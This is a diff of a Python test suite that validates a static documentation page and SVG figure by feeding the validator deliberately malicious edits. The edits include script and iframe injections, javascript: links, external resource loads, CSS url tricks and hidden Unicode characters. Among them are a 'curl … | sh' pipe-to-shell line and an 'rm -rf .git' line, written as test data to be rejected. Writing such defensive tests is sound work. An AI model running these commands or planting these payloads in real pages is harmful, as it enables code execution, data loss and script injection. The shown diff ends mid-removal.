@@ -922,6 +922,292 @@ def lines_that_hold(text, marker):
     return [line.lstrip(" ") for line in text.split("\n") if marker in line]
 
 
+# Each change below is made once, to the file as it stands in this repo and never to one another row changed, and the
+# page must then fail with one problem that holds every part of the message, or pass where the message is None. Each
+# row is (its name, the text it changes, what it writes in its place, the message), written by hand.
+CODEX_RADIO = '<input type="radio" name="tool" id="tool-codex">'
+MARK = '<svg class="mark" viewBox="0 0 16 16" width="20" height="20" aria-hidden="true"><path d="M8 0'
+LICENSE_LINK = 'href="%s/blob/main/LICENSE"' % REPO
+NO_ELEMENT = "is not an element this page may hold"
+LOADS_ONLY = "and the page loads only a file in docs/ by its name"
+NOT_AN_INPUT = "an <input> is a radio of the picker"
+SVG_VALUE = "and a value in an <svg> is numbers and words"
+NOT_A_SAMPLE = "is not a line of a code block marked sh in README.md"
+IMAGE = '<img class="notch" src="ratchet-notch.svg"'
+LOADED = "the figure ratchet-notch.svg is loaded by %s, and one <img> loads it, once"
+PAGE_CHANGES = (
+    ("no doctype", "<!DOCTYPE html>\n", "", "does not start with <!DOCTYPE html>"),
+    ("hidden U+000D", "<h1>Ratchet</h1>", "<h1>Ratchet\r</h1>", "holds U+000D"),
+    ("hidden U+0009", "<h1>Ratchet</h1>", "<h1>Ratchet\t</h1>", "holds U+0009"),
+    ("hidden U+202E", "<h1>Ratchet</h1>", "<h1>Ratchet‮</h1>", "holds U+202E"),
+    ("hidden U+200B", "<h1>Ratchet</h1>", "<h1>Ratchet​</h1>", "holds U+200B"),
+    ("hidden U+FEFF", "<h1>Ratchet</h1>", "<h1>Ratchet﻿</h1>", "holds U+FEFF"),
+    ("hidden U+0000", "<h1>Ratchet</h1>", "<h1>Ratchet\x00</h1>", "holds U+0000"),
+    ("script from elsewhere", "</main>", '<script src="https://example.invalid/t.js"></script>\n</main>', NO_ELEMENT),
+    ("script inline", "</main>", "<script>document.title = 'x'</script>\n</main>", NO_ELEMENT),
+    ("script in capitals", "</main>", '<SCRIPT src="t.js"></SCRIPT>\n</main>', NO_ELEMENT),
+    ("iframe", "</main>", '<iframe src="https://example.invalid/"></iframe>\n</main>', NO_ELEMENT),
+    ("object", "</main>", '<object data="https://example.invalid/x"></object>\n</main>', NO_ELEMENT),
+    ("embed", "</main>", '<embed src="https://example.invalid/x">\n</main>', NO_ELEMENT),
+    ("base", "</main>", '<base href="https://example.invalid/">\n</main>', NO_ELEMENT),
+    ("form", "</main>", '<form action="https://example.invalid/"></form>\n</main>', NO_ELEMENT),
+    ("svg image", "</main>", '<svg><image href="https://example.invalid/x.png"></image></svg>\n</main>', NO_ELEMENT),
+    ("audio", "</main>", '<audio src="x.mp3"></audio>\n</main>', NO_ELEMENT),
+    ("svg script", "</main>", "<svg><script>alert(1)</script></svg>\n</main>", NO_ELEMENT),
+    ("svg use", "</main>", '<svg><use href="#why"></use></svg>\n</main>', NO_ELEMENT),
+    ("svg foreignObject", "</main>", "<svg><foreignObject><p>x</p></foreignObject></svg>\n</main>", NO_ELEMENT),
+    ("svg animate", "</main>", '<svg><animate attributeName="x"></animate></svg>\n</main>', NO_ELEMENT),
+    ("svg set", "</main>", '<svg><set attributeName="x"></set></svg>\n</main>', NO_ELEMENT),
+    ("svg g", "</main>", "<svg><g></g></svg>\n</main>", NO_ELEMENT),
+    ("svg circle", "</main>", '<svg><circle r="1"></circle></svg>\n</main>', NO_ELEMENT),
+    ("use", "</main>", '<use href="#why"></use>\n</main>', NO_ELEMENT),
+    ("foreignObject", "</main>", "<foreignObject><p>x</p></foreignObject>\n</main>", NO_ELEMENT),
+    ("animate", "</main>", '<animate attributeName="x"></animate>\n</main>', NO_ELEMENT),
+    ("input text", CODEX_RADIO, '<input type="text" name="tool" id="tool-codex">', NOT_AN_INPUT),
+    ("input submit", CODEX_RADIO, '<input type="submit" name="tool" id="tool-codex">', NOT_AN_INPUT),
+    ("input of another name", CODEX_RADIO, '<input type="radio" name="other" id="tool-codex">', NOT_AN_INPUT),
+    ("input without a type", CODEX_RADIO, '<input name="tool" id="tool-codex">', NOT_AN_INPUT),
+    ("input checked empty", CODEX_RADIO, '<input type="radio" name="tool" id="tool-codex" checked="">',
+     'checked is written checked="checked"'),
+    ("input checked bare", CODEX_RADIO, '<input type="radio" name="tool" id="tool-codex" checked>',
+     "has the attribute checked without a value"),
+    ("input formaction", CODEX_RADIO, '<input type="radio" name="tool" id="tool-codex" formaction="https://example.invalid/">',
+     "<input> may not have the attribute formaction"),
+    ("input onchange", CODEX_RADIO, '<input type="radio" name="tool" id="tool-codex" onchange="x()">',
+     "<input> may not have the attribute onchange"),
+    ("input value", CODEX_RADIO, '<input type="radio" name="tool" id="tool-codex" value="x">', "<input> may not have the attribute value"),
+    ("input image", CODEX_RADIO, '<input type="image" name="tool" id="tool-codex" src="https://example.invalid/x.png">',
+     "<input> may not have the attribute src"),
+    ("input closed", CODEX_RADIO, CODEX_RADIO + "</input>", "</input> closes a void element"),
+    ("input outside the picker", "</main>", '<input type="radio" name="tool" id="tool-more">\n</main>',
+     "<input> stands directly in the <fieldset>"),
+    ("label outside the picker", "</main>", '<label for="tool-codex">Codex</label>\n</main>', "<label> stands directly in the <fieldset>"),
+    ("button", "</main>", "<button>Copy</button>\n</main>", "<button> is not an element this page may hold"),
+    ("textarea", "</main>", "<textarea>x</textarea>\n</main>", "<textarea> is not an element this page may hold"),
+    ("select", "</main>", "<select><option>x</option></select>\n</main>", "<select> is not an element this page may hold"),
+    ("form around the picker", '<fieldset class="tools">', '<form action="https://example.invalid/"><fieldset class="tools">',
+     "<form> is not an element this page may hold"),
+    ("mark onload", MARK, MARK.replace('<svg class="mark"', '<svg class="mark" onload="alert(1)"'),
+     "<svg> may not have the attribute onload"),
+    ("mark style", MARK, MARK.replace('<svg class="mark"', '<svg class="mark" style="fill: red"'),
+     "<svg> may not have the attribute style"),
+    ("mark role", MARK, MARK.replace('<svg class="mark"', '<svg class="mark" role="img" aria-labelledby="t"'),
+     "<svg> may not have the attribute role"),
+    ("path onclick", MARK, MARK.replace("<path d=", '<path onclick="x" d='), "<path> may not have the attribute onclick"),
+    ("path href", MARK, MARK.replace("<path d=", '<path href="https://example.invalid/" d='), "<path> may not have the attribute href"),
+    ("path xlink:href", MARK, MARK.replace("<path d=", '<path xlink:href="#x" d='), "<path> may not have the attribute xlink:href"),
+    ("path fill", MARK, MARK.replace("<path d=", '<path fill="url(#g)" d='), "<path> may not have the attribute fill"),
+    ("mark url in a path", MARK, MARK.replace('<path d="M8 0', '<path d="M8 0; url(x) '), SVG_VALUE),
+    ("mark javascript viewBox", MARK, MARK.replace('viewBox="0 0 16 16"', 'viewBox="javascript:x"'), SVG_VALUE),
+    ("mark url class", MARK, MARK.replace('class="mark"', 'class="url(#x)"'), SVG_VALUE),
+    ("mark title", MARK, MARK.replace("<path d=", "<title>x</title><path d="), "an <svg> holds only <path>, found <title>"),
+    ("mark a", MARK, MARK.replace("<path d=", '<a href="%s">x</a><path d=' % REPO), "an <svg> holds only <path>, found <a>"),
+    ("mark p", MARK, MARK.replace("<path d=", "<p>x</p><path d="), "an <svg> holds only <path>, found <p>"),
+    ("mark svg", MARK, MARK.replace("<path d=", '<svg viewBox="0 0 1 1"></svg><path d='), "an <svg> holds only <path>, found <svg>"),
+    ("mark text", MARK, MARK.replace("<path d=", "words <path d="), "text in an <svg>, which holds no text"),
+    ("path outside an svg", "</main>", '<path d="M0 0 L1 1"></path>\n</main>', "<path> stands directly in an <svg>, and nowhere else"),
+    ("second svg", "</main>", '<svg viewBox="0 0 1 1" width="1" height="1" aria-hidden="true"><path d="M0 0"></path></svg>\n</main>',
+     "holds <svg> 2 times, and must hold it 1 times"),
+    ("mark without its svg", MARK, '<path d="M8 0', "<path> stands directly in an <svg>, and nowhere else"),
+    ("img onload", '<img src="ratchet-light.svg"', '<img onload="x()" src="ratchet-light.svg"', "<img> may not have the attribute onload"),
+    ("img style", '<img src="ratchet-light.svg"', '<img style="background: url(https://example.invalid/x.png)" src="ratchet-light.svg"',
+     "<img> may not have the attribute style"),
+    ("img srcset", '<img src="ratchet-light.svg"', '<img srcset="https://example.invalid/x.png 2x" src="ratchet-light.svg"',
+     "<img> may not have the attribute srcset"),
+    ("img loading", '<img src="ratchet-light.svg"', '<img loading="lazy" src="ratchet-light.svg"', "<img> may not have the attribute loading"),
+    ("load https", '<img src="ratchet-light.svg"', '<img src="https://example.invalid/ratchet-light.svg"', LOADS_ONLY),
+    ("load protocol-relative", '<img src="ratchet-light.svg"', '<img src="//example.invalid/ratchet-light.svg"', LOADS_ONLY),
+    ("load by a reference", '<img src="ratchet-light.svg"', '<img src="&#104;ttps://example.invalid/x.svg"', LOADS_ONLY),
+    ("load from the repo", '<img src="ratchet-light.svg"', '<img src="' + REPO + '/raw/main/assets/ratchet-light.svg"', LOADS_ONLY),
+    ("load from outside docs", '<img src="ratchet-light.svg"', '<img src="../assets/ratchet-light.svg"', LOADS_ONLY),
+    ("load srcset", 'srcset="ratchet-dark.svg"', 'srcset="https://example.invalid/ratchet-dark.svg"', LOADS_ONLY),
+    ("load icon", '<link rel="icon" href="ratchet-light.svg"', '<link rel="icon" href="https://example.invalid/i.svg"', LOADS_ONLY),
+    ("css import", "</style>", "@import 'https://example.invalid/x.css';\n</style>", "@import"),
+    ("css font-face", "</style>", "@font-face { font-family: x; src: local(x); }\n</style>", "@font-face"),
+    ("css url", "</style>", "body { background: url(https://example.invalid/x.png); }\n</style>", '"url"'),
+    ("css url in capitals", "</style>", "body { background: URL(x.png); }\n</style>", '"url"'),
+    ("css backslash", "</style>", "body { background: u\\72l(x.png); }\n</style>", "backslash"),
+    ("css image-set", "</style>", "body { background: image-set('x.png' 1x); }\n</style>", "image-set()"),
+    ("css calc", "</style>", "body { width: calc(1px + 1px); }\n</style>", "calc()"),
+    ("stylesheet link", '<link rel="icon"', '<link rel="stylesheet"', 'the only <link> is rel="icon"'),
+    ("link out example", 'href="%s"' % REPO, 'href="https://example.invalid/"', "the link"),
+    ("link out http", 'href="%s"' % REPO, 'href="http://github.com/fabian-von-tiedemann/ratchet"', "the link"),
+    ("link out other repo", 'href="%s"' % REPO, 'href="https://github.com/fabian-von-tiedemann/ratchet-other"', "the link"),
+    ("link out owner", 'href="%s"' % REPO, 'href="https://github.com/fabian-von-tiedemann"', "the link"),
+    ("link out javascript", 'href="%s"' % REPO, 'href="javascript:alert(1)"', "the link"),
+    ("link out javascript by a reference", 'href="%s"' % REPO, 'href="&#106;avascript:alert(1)"', "the link"),
+    ("link out mailto", 'href="%s"' % REPO, 'href="mailto:x@example.invalid"', "the link"),
+    ("link out pages", 'href="%s"' % REPO, 'href="https://fabian-von-tiedemann.github.io/ratchet/"', "the link"),
+    ("link out protocol-relative", 'href="%s"' % REPO, 'href="//example.invalid/"', "the link"),
+    # A source in sources.json is credited in RATCHET.md, which the page links to, and not on the page.
+    ("link out source", 'href="%s"' % REPO, 'href="https://github.com/mattpocock/skills"', "the link"),
+    ("link out source tree", 'href="%s"' % REPO, 'href="https://github.com/cursor/plugins/tree/HEAD/pstack"', "the link"),
+    ("link in to no file", LICENSE_LINK, 'href="%s/blob/main/NOT-A-FILE.md"' % REPO, "names a file that is not in this checkout"),
+    ("link in to no directory", LICENSE_LINK, 'href="%s/tree/main/not-a-directory"' % REPO,
+     "names a directory that is not in this checkout"),
+    ("link in to a directory as a file", LICENSE_LINK, 'href="%s/blob/main/checks"' % REPO, "names a file that is not in this checkout"),
+    ("link in and out", LICENSE_LINK, 'href="%s/blob/main/../../other/x"' % REPO, "goes into the repo, but not"),
+    ("link in to another branch", LICENSE_LINK, 'href="%s/blob/other/README.md"' % REPO, "goes into the repo, but not"),
+    ("link in to settings", LICENSE_LINK, 'href="%s/settings"' % REPO, "goes into the repo, but not"),
+    ("link in through releases", LICENSE_LINK, 'href="%s/releases/latest/../../x"' % REPO, "goes into the repo, but not"),
+    ("an issue passes", LICENSE_LINK, 'href="%s/issues/49"' % REPO, None),
+    ("a pull request passes", LICENSE_LINK, 'href="%s/pull/42"' % REPO, None),
+    ("the latest release passes", LICENSE_LINK, 'href="%s/releases/latest"' % REPO, None),
+    ("the issues pass", LICENSE_LINK, 'href="%s/issues"' % REPO, None),
+    ("issue 0", LICENSE_LINK, 'href="%s/issues/0"' % REPO, "goes into the repo, but not"),
+    ("issue and out", LICENSE_LINK, 'href="%s/issues/49/../../x"' % REPO, "goes into the repo, but not"),
+    ("issues slash", LICENSE_LINK, 'href="%s/issues/"' % REPO, "goes into the repo, but not"),
+    ("new issue", LICENSE_LINK, 'href="%s/issues/new"' % REPO, "goes into the repo, but not"),
+    ("issues query", LICENSE_LINK, 'href="%s/issues?q=x"' % REPO, "goes into the repo, but not"),
+    ("issues fragment", LICENSE_LINK, 'href="%s/issues#reports"' % REPO, "goes into the repo, but not"),
+    ("pull request 0", LICENSE_LINK, 'href="%s/pull/0"' % REPO, "goes into the repo, but not"),
+    ("pulls", LICENSE_LINK, 'href="%s/pulls"' % REPO, "goes into the repo, but not"),
+    ("relative missing page", 'href="#start-here"', 'href="missing.html"', "the link"),
+    ("relative out of docs", 'href="#start-here"', 'href="../README.md"', "the link"),
+    ("absolute path", 'href="#start-here"', 'href="/index.html"', "the link"),
+    ("fragment missing", 'href="#start-here"', 'href="#no-such-id"', "the link"),
+    ("relative nojekyll", 'href="#start-here"', 'href=".nojekyll"', "the link"),
+    ("relative link to the page passes", 'href="#start-here"', 'href="index.html#start-here"', None),
+    # The first is a typo for the id start-here, in a link to the page by its name.
+    ("page fragment typo", 'href="#start-here"', 'href="index.html#start-hree"', ("the link 'index.html#start-hree'", "is not an id on")),
+    ("page fragment case", 'href="#start-here"', 'href="index.html#Start-here"', ("the link 'index.html#Start-here'", "is not an id on")),
+    ("page fragment empty", 'href="#start-here"', 'href="index.html#"', ("the link 'index.html#'", "is not an id on")),
+    ("fragment not an id", 'href="#start-here"', 'href="#missing"', ("the link '#missing'", "is not an id on")),
+    ("fragment typo", 'href="#start-here"', 'href="#start-hree"', ("the link '#start-hree'", "is not an id on")),
+    ("fragment empty", 'href="#start-here"', 'href="#"', ("the link '#'", "is not an id on")),
+    ("fragment on a file", 'href="#start-here"', 'href="ratchet-light.svg#logo"',
+     ("the link 'ratchet-light.svg#logo'", "only a link to a page in docs/ may have a fragment")),
+    # The second start-here is one a link names, so the link would lead to either.
+    ("id twice", '<h2 id="how-it-works">', '<h2 id="start-here">', "ids that stand more than once: start-here"),
+    ("main left open", "</main>", "", "</body> does not close the element that is open, <main>"),
+    ("closed out of order", "<h1>Ratchet</h1>", "<h1><em>Ratchet</h1></em>", "</h1> does not close the element that is open, <em>"),
+    ("closed but not open", "<h1>Ratchet</h1>", "<h1>Ratchet</h1></p>", "</p> does not close"),
+    ("void closed", "<h1>Ratchet</h1>", "<h1>Ratchet</h1><br></br>", "</br> closes a void element"),
+    ("closed by a slash", "<h1>Ratchet</h1>", "<h1>Ratchet</h1><p/>", "<p/> is not closed by its slash"),
+    ("comment", "<h1>Ratchet</h1>", "<h1>Ratchet</h1><!-- x -->", "which the page does not hold"),
+    ("cdata", "<h1>Ratchet</h1>", "<h1>Ratchet</h1><![CDATA[x]]>", "which the page does not hold"),
+    ("processing instruction", "<h1>Ratchet</h1>", "<h1>Ratchet</h1><?php ?>", "which the page does not hold"),
+    ("attribute twice", "<h1>Ratchet</h1>", '<h1 id="x" id="y">Ratchet</h1>', "has the attribute id twice"),
+    ("hidden attribute", "<h1>Ratchet</h1>", "<h1 hidden>Ratchet</h1>", "may not have the attribute hidden"),
+    ("title in main", "<main>", "<main><title>x</title>", "a <title> stands in <head>, and nowhere else"),
+    ("title in a heading", "<h1>Ratchet</h1>", "<h1>Ratchet<title>x</title></h1>", "a <title> stands in <head>, and nowhere else"),
+    ("second title", "</title>\n", "</title>\n<title>x</title>\n", "holds <title> 2 times in <head>, and must hold it once"),
+    ("no lang", '<html lang="en">', "<html>", 'must have lang="en"'),
+    ("empty alt", 'alt="Ratchet logo"', 'alt=""', "an <img> without alt text"),
+    ("no alt", 'alt="Ratchet logo"', "", "an <img> without alt text"),
+    ("heading skips a level", "<h1>Ratchet</h1>", "<h1>Ratchet</h1><h3>x</h3>", "<h3> after <h1> skips a level"),
+    ("no h1", "<h1>Ratchet</h1>", "<h2>Ratchet</h2>", "holds <h1> 0 times"),
+    ("command init --force", "python3 .ratchet/checks/init.py --check</code>", "python3 .ratchet/checks/init.py --force</code>",
+     NOT_A_SAMPLE),
+    ("command curl", "python3 .ratchet/checks/init.py</code>", "curl https://example.invalid/i | sh</code>", NOT_A_SAMPLE),
+    ("command and rm", "python3 .ratchet/checks/init.py</code>", "python3 .ratchet/checks/init.py\nrm -rf .git</code>", NOT_A_SAMPLE),
+    ("step without a link", '<a href="https://github.com/fabian-von-tiedemann/ratchet/blob/main/REGISTER.md">Ratchet\'s own register</a>',
+     "Ratchet's own register", "a step that links nowhere in this repo"),
+    ("figure from another file", IMAGE, '<img class="notch" src="ratchet-light.svg"', LOADED % "nothing"),
+    ("figure loaded twice", "</main>", IMAGE + ' alt="x">\n</main>', LOADED % "<img>, <img>"),
+    ("figure as the icon", '<link rel="icon" href="ratchet-light.svg"', '<link rel="icon" href="ratchet-notch.svg"', LOADED % "<link>, <img>"),
+    ("figure in a picture", IMAGE, '<picture><source srcset="ratchet-notch.svg"></picture>\n<img src="ratchet-light.svg"',
+     LOADED % "<source>"),
+    ("figure without alt text", 'height="344" alt="A ratchet wheel', 'height="344" alt=" " title="A ratchet wheel',
+     "an <img> without alt text"),
+    ("page color moved", "--muted: #56524a;", "--muted: #504c44;",
+     "docs/ratchet-notch.svg: in the light palette, --muted is #56524a, and the page's is #504c44"),
+)
+ENTITY = '<!DOCTYPE svg [<!ENTITY x "failure">]>\n<svg '
+FIGURE_ELEMENT = ("docs/ratchet-notch.svg:", "is not an element the figure may hold")
+FIGURE_VALUE_ONLY = ("docs/ratchet-notch.svg:", "and a value in the figure is numbers and words")
+FIGURE_ATTRIBUTE = "docs/ratchet-notch.svg: <circle> may not have the attribute"
+FIGURE_BANG = ("docs/ratchet-notch.svg: holds '<!'", "which the figure does not hold")
+FIGURE_TEXT = ("docs/ratchet-notch.svg: text in or after", "the figure holds text only in <text> and <style>")
+FIGURE_CHANGES = (
+    ("doctype", "<svg ", ENTITY, FIGURE_BANG),
+    ("xml declaration", "<svg ", '<?xml version="1.0"?>\n<svg ', ("docs/ratchet-notch.svg: holds '<?'", "which the figure does not hold")),
+    ("stylesheet instruction", "<svg ", '<?xml-stylesheet href="https://example.invalid/x.css"?>\n<svg ',
+     ("docs/ratchet-notch.svg: holds '<?'", "which the figure does not hold")),
+    ("comment", "</style>", "</style>\n<!-- x -->", FIGURE_BANG),
+    ("cdata", ">one notch tighter<", "><![CDATA[one notch]]><", FIGURE_BANG),
+    ("character reference", ">one notch tighter<", ">one notch &#116;ighter<",
+     ("docs/ratchet-notch.svg: holds '&'", "which the figure does not hold")),
+    ("entity reference", ">one notch tighter<", ">one &amp; one<", ("docs/ratchet-notch.svg: holds '&'", "which the figure does not hold")),
+    ("svg left open", "</svg>", "", "docs/ratchet-notch.svg: not well-formed XML"),
+    ("rect left open", 'rx="8"/>', 'rx="8">', "docs/ratchet-notch.svg: not well-formed XML"),
+    ("attribute twice", 'rx="8"/>', 'rx="8" rx="8"/>', "docs/ratchet-notch.svg: not well-formed XML"),
+    ("text before the svg", "<svg ", "x<svg ", "docs/ratchet-notch.svg: not well-formed XML"),
+    ("script", "</style>", "</style>\n<script>alert(1)</script>", FIGURE_ELEMENT),
+    ("script from elsewhere", "</style>", '</style>\n<script href="https://example.invalid/t.js"/>', FIGURE_ELEMENT),
+    ("use", "</style>", '</style>\n<use href="#x"/>', FIGURE_ELEMENT),
+    ("image", "</style>", '</style>\n<image href="https://example.invalid/x.png"/>', FIGURE_ELEMENT),
+    ("a", "</style>", '</style>\n<a href="https://example.invalid/"><text>x</text></a>', FIGURE_ELEMENT),
+    ("foreignObject", "</style>", "</style>\n<foreignObject><p>x</p></foreignObject>", FIGURE_ELEMENT),
+    ("animate", "</style>", '</style>\n<animate attributeName="x"/>', FIGURE_ELEMENT),
+    ("set", "</style>", '</style>\n<set attributeName="x"/>', FIGURE_ELEMENT),
+    ("title", "</style>", "</style>\n<title>x</title>", FIGURE_ELEMENT),
+    ("defs", "</style>", "</style>\n<defs/>", FIGURE_ELEMENT),
+    ("use in a g", "</style>", "</style>\n<g><use/></g>", FIGURE_ELEMENT),
+    ("svg", "</style>", "</style>\n<svg/>", FIGURE_ELEMENT),
+    ("svg with its namespace", "</style>", '</style>\n<svg xmlns="http://www.w3.org/2000/svg"/>', FIGURE_ELEMENT),
+    ("circle of html", "</style>", '</style>\n<circle xmlns="http://www.w3.org/1999/xhtml"/>', FIGURE_ELEMENT),
+    ("script of html", "</style>", '</style>\n<x:script xmlns:x="http://www.w3.org/1999/xhtml">1</x:script>', FIGURE_ELEMENT),
+    ("no namespace", ' xmlns="http://www.w3.org/2000/svg"', "", "docs/ratchet-notch.svg: <svg> is not an element the figure may hold"),
+    ("circle onload", '<circle class="pivot"', '<circle onload="alert(1)" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle onclick", '<circle class="pivot"', '<circle onclick="x" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle style", '<circle class="pivot"', '<circle style="fill: red" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle fill", '<circle class="pivot"', '<circle fill="#ff0000" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle stroke", '<circle class="pivot"', '<circle stroke="red" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle id", '<circle class="pivot"', '<circle id="x" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle href", '<circle class="pivot"', '<circle href="https://example.invalid/" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle filter", '<circle class="pivot"', '<circle filter="url(#f)" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle transform", '<circle class="pivot"', '<circle transform="rotate(45)" class="pivot"', FIGURE_ATTRIBUTE),
+    ("circle xlink:href", '<circle class="pivot"',
+     '<circle xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://example.invalid/" class="pivot"',
+     FIGURE_ATTRIBUTE),
+    ("svg onload", 'role="img"', 'role="img" onload="alert(1)"', "docs/ratchet-notch.svg: <svg> may not have the attribute onload"),
+    ("class url", 'class="pivot"', 'class="url(#x)"', FIGURE_VALUE_ONLY),
+    ("class empty", 'class="pivot"', 'class=""', FIGURE_VALUE_ONLY),
+    ("r calc", 'r="8.5"', 'r="calc(1px)"', FIGURE_VALUE_ONLY),
+    ("path with a semicolon", '<path class="pawl" d="M', '<path class="pawl" d="M1 1; M', FIGURE_VALUE_ONLY),
+    ("text-anchor javascript", 'text-anchor="end">can', 'text-anchor="javascript:x">can', FIGURE_VALUE_ONLY),
+    ("aria-label with an address", 'aria-label="A ratchet wheel', 'aria-label="https://example.invalid/ A ratchet wheel', FIGURE_VALUE_ONLY),
+    ("element in text", ">one notch tighter<", '>one <circle class="ball" cx="1" cy="1" r="1"/><',
+     "docs/ratchet-notch.svg: <text> holds an element, and only the <svg> and a <g> hold elements"),
+    ("g id", '<g class="tick">', '<g class="tick" id="x">', "docs/ratchet-notch.svg: <g> may not have the attribute id"),
+    ("text after the style", "</style>", "</style>\nfailure", FIGURE_TEXT),
+    ("text in a rect", 'rx="8"/>', 'rx="8">failure</rect>', FIGURE_TEXT),
+    ("text at the end", "</svg>", "failure</svg>", FIGURE_TEXT),
+    ("css import", "</style>", '@import "https://example.invalid/x.css";\n</style>', ("docs/ratchet-notch.svg: the CSS ", "holds @import")),
+    ("css font-face", "</style>", "@font-face { font-family: x; }\n</style>", ("docs/ratchet-notch.svg: the CSS ", "holds @font-face")),
+    ("css url", "</style>", ".ball { fill: url(#g); }\n</style>", ("docs/ratchet-notch.svg: the CSS ", 'holds "url"')),
+    ("css backslash", "</style>", ".ball { fill: \\75rl(x); }\n</style>", ("docs/ratchet-notch.svg: the CSS ", "holds a backslash")),
+    ("css calc", "</style>", ".ball { r: calc(1px); }\n</style>", ("docs/ratchet-notch.svg: the CSS ", "calls calc()")),
+    ("css hex color", "</style>", ".ball { fill: #ff0000; }\n</style>",
+     ("docs/ratchet-notch.svg: the CSS ", "a hex color outside the two palettes")),
+    ("css transition", "</style>", ".ball { transition: fill 1s; }\n</style>", ("docs/ratchet-notch.svg: the CSS ", "moves the page outside")),
+    ("css brace", "</style>", ".ball {\n</style>", ("docs/ratchet-notch.svg: the CSS ", "a brace that is not matched")),
+    ("css two light palettes", DARK, "@media (prefers-color-scheme: light)", "docs/ratchet-notch.svg: the CSS has two :root blocks of colors"),
+)
+
+
+def assert_changes(case, name, changes):
+    """Each row of changes, made to docs/<name> as it stands in this repo, with every other file of docs/ that a row
+    may change written again as it stands there, so that no row sees what another changed."""
+    for title, old, new, message in changes:
+        with case.subTest(title):
+            for each in (PAGE, FIGURE):
+                with open(os.path.join(ROOT, DOCS, each), encoding="utf-8", newline="") as handle:
+                    text = handle.read()
+                if each == name:
+                    case.assertIn(old, text, "the test expects %r in %s" % (old, name))
+                    text = text.replace(old, new, 1)
+                with open(os.path.join(case.copy, DOCS, each), "w", encoding="utf-8", newline="") as handle:
+                    handle.write(text)
+            problems = page_problems(case.copy)
+            if message is None:
+                case.assertEqual(problems, [])
+            else:
+                parts = (message,) if isinstance(message, str) else message
+                case.assertTrue(any(all(part in problem for part in parts) for problem in problems), "%r not in %r" % (parts, problems))
+
+
 class Page(RepoCopy, unittest.TestCase):
     """The page as it stands passes, and each change below fails with its message."""
 
@@ -943,6 +1229,9 @@ class Page(RepoCopy, unittest.TestCase):
     def test_the_page_as_it_stands_passes(self):
         self.assertEqual(page_problems(ROOT), [])
         self.assertEqual(page_problems(self.copy), [])
+
+    def test_each_change_of_the_page_fails_or_passes_as_its_row_says(self):
+        assert_changes(self, PAGE, PAGE_CHANGES)
 
     def test_the_page_names_what_it_must(self):
         text = self.page()
@@ -1018,218 +1307,6 @@ class Page(RepoCopy, unittest.TestCase):
             handle.write(b"\xff\n")
         self.assert_fails("docs/index.html: not valid UTF-8 at byte")
 
-    def test_a_hidden_character_fails(self):
-        for character in ("\r", "\t", "\u202e", "\u200b", "\ufeff", "\x00"):
-            with self.subTest(code="%04X" % ord(character)):
-                self.setUp()
-                self.change("<h1>Ratchet</h1>", "<h1>Ratchet%s</h1>" % character)
-                self.assert_fails("holds U+%04X" % ord(character))
-
-    def test_a_page_without_its_doctype_fails(self):
-        self.change("<!DOCTYPE html>\n", "")
-        self.assert_fails("does not start with <!DOCTYPE html>")
-
-    def test_a_script_fails_in_every_form(self):
-        for script in ('<script src="https://example.invalid/t.js"></script>', "<script>document.title = 'x'</script>",
-                       '<SCRIPT src="t.js"></SCRIPT>', '<iframe src="https://example.invalid/"></iframe>',
-                       '<object data="https://example.invalid/x"></object>', '<embed src="https://example.invalid/x">',
-                       '<base href="https://example.invalid/">', '<form action="https://example.invalid/"></form>',
-                       '<svg><image href="https://example.invalid/x.png"></image></svg>', '<audio src="x.mp3"></audio>',
-                       '<svg><script>alert(1)</script></svg>', '<svg><use href="#why"></use></svg>',
-                       "<svg><foreignObject><p>x</p></foreignObject></svg>", '<svg><animate attributeName="x"></animate></svg>',
-                       '<svg><set attributeName="x"></set></svg>', '<svg><g></g></svg>', '<svg><circle r="1"></circle></svg>',
-                       '<use href="#why"></use>', "<foreignObject><p>x</p></foreignObject>", '<animate attributeName="x"></animate>'):
-            with self.subTest(script=script):
-                self.setUp()
-                self.change("</main>", script + "\n</main>")
-                self.assert_fails("is not an element this page may hold")
-
-    def test_an_input_that_is_not_a_radio_of_the_picker_or_a_control_that_sends_something_fails(self):
-        radio = '<input type="radio" name="tool" id="tool-codex">'
-        for old, new, message in (
-                (radio, '<input type="text" name="tool" id="tool-codex">', "an <input> is a radio of the picker"),
-                (radio, '<input type="submit" name="tool" id="tool-codex">', "an <input> is a radio of the picker"),
-                (radio, '<input type="radio" name="other" id="tool-codex">', "an <input> is a radio of the picker"),
-                (radio, '<input name="tool" id="tool-codex">', "an <input> is a radio of the picker"),
-                (radio, '<input type="radio" name="tool" id="tool-codex" checked="">', 'checked is written checked="checked"'),
-                (radio, '<input type="radio" name="tool" id="tool-codex" checked>', "has the attribute checked without a value"),
-                (radio, '<input type="radio" name="tool" id="tool-codex" formaction="https://example.invalid/">',
-                 "<input> may not have the attribute formaction"),
-                (radio, '<input type="radio" name="tool" id="tool-codex" onchange="x()">', "<input> may not have the attribute onchange"),
-                (radio, '<input type="radio" name="tool" id="tool-codex" value="x">', "<input> may not have the attribute value"),
-                (radio, '<input type="image" name="tool" id="tool-codex" src="https://example.invalid/x.png">',
-                 "<input> may not have the attribute src"),
-                (radio, radio + "</input>", "</input> closes a void element"),
-                ("</main>", '<input type="radio" name="tool" id="tool-more">\n</main>', "<input> stands directly in the <fieldset>"),
-                ("</main>", '<label for="tool-codex">Codex</label>\n</main>', "<label> stands directly in the <fieldset>"),
-                ("</main>", "<button>Copy</button>\n</main>", "<button> is not an element this page may hold"),
-                ("</main>", "<textarea>x</textarea>\n</main>", "<textarea> is not an element this page may hold"),
-                ("</main>", "<select><option>x</option></select>\n</main>", "<select> is not an element this page may hold"),
-                ('<fieldset class="tools">', '<form action="https://example.invalid/"><fieldset class="tools">',
-                 "<form> is not an element this page may hold")):
-            with self.subTest(new=new):
-                self.setUp()
-                self.change(old, new)
-                self.assert_fails(message)
-
-    def test_an_inline_svg_that_is_more_than_the_mark_fails(self):
-        mark = '<svg class="mark" viewBox="0 0 16 16" width="20" height="20" aria-hidden="true"><path d="M8 0'
-        for old, new, message in (
